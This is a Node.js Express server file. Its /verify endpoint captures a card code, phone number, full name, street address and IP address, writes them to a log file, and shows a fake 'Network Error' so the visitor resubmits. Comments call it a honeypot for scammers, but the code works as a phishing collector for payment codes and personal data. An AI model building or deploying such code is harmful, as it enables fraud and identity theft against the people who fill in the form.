const express = require('express');
const requestIp = require('request-ip');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(requestIp.mw());

// Serve static files (the frontend)
app.use(express.static('public'));

// Endpoint to capture form data
app.post('/verify', (req, res) => {
    const ip = req.clientIp;
    const timestamp = new Date().toISOString();
    const { cardCode, phoneNumber, fullName, address, city, zipCode } = req.body;

    const logEntry = `[${timestamp}] IP: ${ip} | Code: ${cardCode} | Name: ${fullName} | Addr: ${address}, ${city} ${zipCode} | Ph: ${phoneNumber}\n`;

    fs.appendFileSync('logs.txt', logEntry);

    console.log(`Captured: ${logEntry.trim()}`);

    // Return a generic error to keep the "scammer" on the hook or make it look like a failure
    res.send(`
        <div style="font-family: sans-serif; text-align: center; padding: 50px;">
            <h2 style="color: red;">Network Error</h2>
            <p>Verification failed. Please check your card code and try again in 10 minutes.</p>
            <a href="/">Go Back</a>
        </div>
    `);
});

app.listen(port, () => {
    console.log(`Honeypot server running at http://localhost:${port}`);
    console.log(`View logs in 'logs.txt'`);
});
